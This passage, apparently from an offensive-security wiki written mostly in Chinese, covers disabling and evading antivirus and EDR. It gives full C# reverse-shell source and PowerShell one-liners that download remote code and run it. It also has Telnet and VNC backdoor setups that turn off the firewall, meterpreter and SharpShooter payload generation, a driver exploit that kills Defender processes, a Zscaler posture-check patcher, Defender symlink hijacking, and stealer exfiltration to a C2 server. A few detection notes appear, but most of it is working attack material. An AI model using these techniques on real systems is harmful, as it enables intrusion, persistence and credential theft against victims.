该仓库指出：Defender 仍然会扫描脚本，但通过使用 Go、Java、PHP 等语言，我们在**绕过静态签名**方面有了更大的灵活性。使用这些语言的随机未混淆反向 shell 脚本进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者**操作访问令牌（access token）或像 EDR 或 AV 这样的安全产品**的技术，使得它们的权限被降低，从而进程不会终止，但没有权限去检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程的令牌句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，只需在受害者电脑上部署 Chrome Remote Desktop，便可以接管并维持持久访问：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者机器上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导将要求你授权；点击 Authorize 按钮继续。
4. 运行给出的参数并做一些调整：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数允许无需 GUI 即可设置 PIN）。

## Advanced Evasion

Evasion 是一个非常复杂的话题，有时你必须在单个系统内考虑许多不同的遥测源，因此在成熟的环境中完全不被发现几乎是不可能的。

你面对的每个环境都会有其自身的强项和弱点。

我强烈建议你去观看这场来自 [@ATTL4S](https://twitter.com/DaniLJ94) 的演讲，以便深入了解更多 Advanced Evasion 技术。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是来自 [@mariuszbit](https://twitter.com/mariuszbit) 的另一场关于 Evasion in Depth 的精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**删除二进制的部分内容**直到**找出 Defender 认为恶意的那一部分**并把结果拆分给你。\
另一个做相同事情的工具是 [**avred**](https://github.com/dobin/avred)，其在线服务位于 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

直到 Windows10，所有 Windows 都自带一个可以安装的**Telnet server**（以管理员身份）操作如下：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**start**，并立即**run**它：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口** (stealth) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**在主机上**: 执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **新创建的** 文件 _**UltraVNC.ini**_ 放到 **victim** 中

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告:** 为了保持隐蔽性，你必须避免以下行为

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动 lister**，并 **执行 xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前 defender 会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
将其与以下一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器的示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终结 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具，在投放勒索软件之前禁用端点防护。该工具携带其 **own vulnerable but *signed* driver** 并滥用它发起特权内核操作，即便是 Protected-Process-Light (PPL) 的 AV 服务也无法阻止。

主要结论
1. **Signed driver**: 写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。由于该驱动具有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为 **kernel service**，第二行启动它，使得 `\\.\ServiceMouse` 可从用户态访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD 完全绕过用户态保护；在内核中执行的代码可以打开 *protected* 进程、终止它们或篡改内核对象，而不受 PPL/PP、ELAM 或其它加固特性的限制。

Detection / Mitigation
•  启用 Microsoft 的 vulnerable-driver 阻止列表（`HVCI`, `Smart App Control`），以便 Windows 拒绝加载 `AToolsKrnl64.sys`。  
•  监控新的 *kernel* 服务创建，并在驱动从可被全体写入的目录加载或不在允许列表中时报警。  
•  监视对自定义设备对象的用户态句柄访问，及随后可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 **Client Connector** 在本地应用设备姿态规则，并依赖 Windows RPC 将结果传达给其他组件。有两个薄弱的设计使得完全绕过成为可能：

1. 姿态评估**完全发生在客户端**（向服务器只发送一个布尔值）。  
2. 内部 RPC 端点仅验证连接的可执行文件是否由 **Zscaler 签名**（通过 `WinVerifyTrust`）。

通过 **在磁盘上 patch 四个已签名的二进制文件** 可以使这两种机制失效：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都认为合规 |
| `ZSAService.exe` | 间接调用 `WinVerifyTrust` | 被 NOP-ed ⇒ 任何（甚至未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的完整性检查 | 被短路处理 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
在替换原始文件并重启服务堆栈后：

* **All** posture checks 显示 **green/compliant**。
* 未签名或被修改的二进制可以打开 named-pipe RPC endpoints（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被入侵的主机获得对由 Zscaler policies 定义的内部网络的不受限制访问。

该案例展示了纯客户端信任决策和简单签名校验如何能通过少量字节补丁被绕过。

## 滥用 Protected Process Light (PPL) 通过 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制执行签名者/级别层级，只有同等或更高等级的受保护进程才能相互篡改。从攻击角度看，如果你可以合法地启动一个启用 PPL 的二进制并控制其参数，你可以将良性功能（例如日志记录）转换成针对 AV/EDR 使用的受保护目录的受限、由 PPL 支持的写原语。

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 原语: ClipUp.exe
- 已签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自行启动并接受一个参数，将日志写入调用者指定的路径。
- 当作为 PPL 进程启动时，文件写入将具有 PPL 支持。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径指向通常受保护的位置。

8.3 短路径助手
- 列出短名：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

滥用链（抽象）
1) 使用可用的启动器（例如 CreateProcessAsPPL），以 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 日志路径参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。如有需要，使用 8.3 短名。
3) 如果目标二进制在运行时通常被 AV 打开/锁定（例如 MsMpEng.exe），通过安装一个能可靠更早运行的自启动服务，把写入计划安排在 AV 启动之前的引导时执行。使用 Process Monitor (boot logging) 验证引导顺序。
4) 重启后，具有 PPL 支持的写入会在 AV 锁定其二进制文件之前发生，从而损坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事项和限制
- 无法控制 ClipUp 写入内容的具体内容，超出放置位置之外；该原语更适合用于破坏，而不是精确的内容注入。
- 需要本地管理员/SYSTEM 权限来安装/启动服务，并需要重启窗口。
- 时机关键：目标不得处于打开状态；引导时执行可以避免文件锁定。

检测
- 在引导期间，检测带有异常参数、尤其由非标准启动器作为父进程启动的 `ClipUp.exe` 进程创建。
- 新服务被配置为自动启动可疑二进制文件并且持续在 Defender/AV 之前启动。在 Defender 启动失败之前，调查服务创建/修改。
- 对 Defender 二进制/Platform 目录进行文件完整性监控；注意带有 protected-process 标志的进程所做的意外文件创建/修改。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非-AV 二进制异常使用 PPL 等级的情况。

缓解措施
- WDAC/Code Integrity：限制哪些签名二进制可以以 PPL 运行及其允许的父进程；阻止在非合法上下文中调用 ClipUp。
- 服务治理：限制自动启动服务的创建/修改并监控启动顺序的操纵。
- 确保启用 Defender tamper protection 和 early-launch 保护；调查指示二进制损坏的启动错误。
- 如果与你的环境兼容（请充分测试），考虑在承载安全工具的卷上禁用 8.3 短名称生成。

关于 PPL 和工具的参考
- Microsoft Protected Processes 概览: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU 参考: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon 引导日志（顺序验证）: https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL 启动器: https://github.com/2x7EQ13/CreateProcessAsPPL
- 技术解析（ClipUp + PPL + boot-order tamper）: https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 通过 Platform Version Folder Symlink Hijack 篡改 Microsoft Defender

Windows Defender 通过枚举以下路径下的子文件夹来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它选择字典序最高的子文件夹（例如 `4.18.25070.5-0`），然后从该位置启动 Defender 服务进程（并相应更新服务/注册表路径）。此选择信任目录条目，包括目录重解析点（symlinks）。管理员可以利用这一点将 Defender 重定向到攻击者可写的路径，从而实现 DLL sideloading 或服务中断。

前提条件
- 本地管理员（用于在 Platform 文件夹下创建目录/symlinks）
- 能够重启或触发 Defender 平台重新选择（引导时服务重启）
- 仅需内置工具（mklink）

为什么可行
- Defender 会阻止对其自身文件夹的写入，但其平台选择会信任目录条目并选择字典序最高的版本，而不会验证目标是否解析到受保护/受信任的路径。

分步（示例）
1) 准备当前 platform 文件夹的可写克隆，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你的文件夹的更高版本目录符号链接：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发器选择 (建议重启):
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能在 `C:\TMP\AV\` 下观察到新的进程路径，并且服务配置/注册表会反映该位置。

Post-exploitation options
- DLL sideloading/code execution: 将 Defender 从其应用程序目录加载的 DLL 投放或替换，以在 Defender 的进程中执行代码。参见上方章节: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 移除 version-symlink，以便下次启动时配置的路径无法解析，Defender 无法启动:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 请注意：该技术本身不会提供权限提升；它需要管理员权限。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以将运行时规避从 C2 implant 移出并放到目标模块本身，通过钩取其 Import Address Table (IAT) 并将选定的 APIs 路由到攻击者控制的、位置无关代码 (PIC)。这将规避手段推广到比许多 kit 暴露的狭窄 API 面（例如 CreateProcessA）更广的范围，并将相同保护扩展到 BOFs 和 post‑exploitation DLLs。

高层方法
- 使用 reflective loader（prepended 或 companion）在目标模块旁边部署一个 PIC blob。该 PIC 必须是自包含且位置无关的。
- 当宿主 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR 并修补目标导入的 IAT 条目（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc），指向精简的 PIC 封装（wrappers）。
- 每个 PIC wrapper 在尾调用真实 API 地址之前执行规避。常见的规避包括：
  - 在调用前后对内存进行掩蔽/解除掩蔽（例如，加密 Beacon 区域、RWX→RX、改变页面名称/权限），然后在调用后恢复。
  - Call‑stack spoofing：构造一个良性栈并切换到目标 API，使得 call‑stack 分析解析为预期的帧。
- 为兼容性，导出一个接口，以便 Aggressor 脚本（或等效工具）可以注册哪些 API 应该为 Beacon、BOFs 和 post‑ex DLLs 钩取。

Why IAT hooking here
- 对于使用被钩取导入的任何代码都有效，无需修改工具代码或依赖 Beacon 代理特定 API。
- 覆盖 post‑ex DLLs：钩取 LoadLibrary* 允许你拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并对它们的 API 调用应用相同的掩蔽/栈规避。
- 通过封装 CreateProcessA/W，可在基于 call‑stack 的检测下恢复对生成进程的 post‑ex 命令的可靠使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意
- 在 relocations/ASLR 之后、首次使用 import 之前应用补丁。Reflective loaders like TitanLdr/AceLdr 展示了在加载模块的 DllMain 中进行 hooking 的情况。
- 保持 wrappers 体积小且 PIC-safe；通过补丁前捕获的原始 IAT 值或 via LdrGetProcedureAddress 来解析真正的 API。
- 对 PIC 使用 RW → RX transitions，避免留下可写且可执行的页面（writable+executable pages）。

Call‑stack spoofing stub
- Draugr‑style PIC stubs 构建一个伪造的调用链（返回地址指向良性模块），然后再 pivot 到真实的 API。
- 这可击败那些期望 Beacon/BOFs 在调用敏感 API 时具有规范栈的检测。
- 与 stack cutting/stack stitching 技术配合使用，以在 API prologue 之前落入期望的堆栈帧内。

Operational integration
- 在 post‑ex DLLs 前面预置 reflective loader，使得 PIC 和 hooks 在 DLL 被加载时自动初始化。
- 使用 Aggressor 脚本注册目标 API，使 Beacon 和 BOFs 无需改动代码即可透明地受益于相同的规避路径。

Detection/DFIR considerations
- IAT 完整性：解析到非 image（heap/anon）地址的条目；对 import 指针进行定期验证。
- 堆栈异常：返回地址不属于已加载映像；突然切换到非 image PIC；RtlUserThreadStart 血统不一致。
- Loader 遥测：进程内写入 IAT、在早期 DllMain 活动中修改 import thunks、加载时创建意外的 RX 区域。
- Image‑load 规避：如果在 hook LoadLibrary*，应监控与 memory masking 事件相关联的 automation/clr 程序集的可疑加载。

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) 展示了现代信息窃取程序如何在单一工作流中融合 AV bypass、anti-analysis 与凭证访问。

### Keyboard layout gating & sandbox delay

- 一个配置标志 (`anti_cis`) 通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现 Cyrillic 布局，样本会丢弃一个空的 `CIS` 标记并在运行 stealers 之前终止，确保在被排除的区域设置上永远不会触发（detonate），同时留下狩猎痕迹。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层的 `check_antivm` 逻辑

- 变体 A 遍历进程列表，对每个名称使用自定义滚动校验和进行哈希，并将其与内嵌的调试器/沙箱阻断列表进行比较；对计算机名重复相同的校验和，并检查如 `C:\analysis` 的工作目录。
- 变体 B 检查系统属性（进程数量下限、最近的运行时长），调用 `OpenServiceA("VBoxGuest")` 来检测 VirtualBox 附加组件，并在 sleep 周期前后进行计时检测以发现单步执行。任何命中都会在模块加载前中止。

### 无文件辅助程序 + 双重 ChaCha20 反射加载

- 主 DLL/EXE 嵌入了一个 Chromium 凭证辅助程序，该辅助程序要么被写入磁盘，要么手动内存映射；在无文件模式下会自行解析 imports/relocations，因此不会留下辅助程序的任何文件痕迹。
- 该辅助程序保存了一个经过双重 ChaCha20 加密的二阶段 DLL（两个 32-byte 密钥 + 12-byte nonces）。双重解密完成后，它对该 blob 进行反射式加载（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的导出函数 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。
- ChromElevator 的例程使用 direct-syscall 反射式 process hollowing 注入到运行中的 Chromium 浏览器，继承 AppBound Encryption 密钥，并直接从 SQLite 数据库中解密密码/cookies/信用卡信息，尽管存在 ABE 强化保护。

### 模块化内存采集 & 分块 HTTP exfil

- `create_memory_based_log` 遍历全局的 `memory_generators` 函数指针表，并为每个启用的模块（Telegram、Discord、Steam、截图、文档、浏览器扩展等）生成一个线程。每个线程将结果写入共享缓冲区，并在约 45s 的 join 窗口后报告其文件计数。
- 完成后，所有内容使用静态链接的 `miniz` 库压缩为 `%TEMP%\\Log.zip`。`ThreadPayload1` 然后 sleep 15s，并通过 HTTP POST 以 10 MB 分块将归档流式上传到 `http://<C2>:6767/upload`，伪造浏览器的 `multipart/form-data` 边界（`----WebKitFormBoundary***`）。每个分块添加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`，最后一个分块追加 `complete: true`，以便 C2 知道重组完成。

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
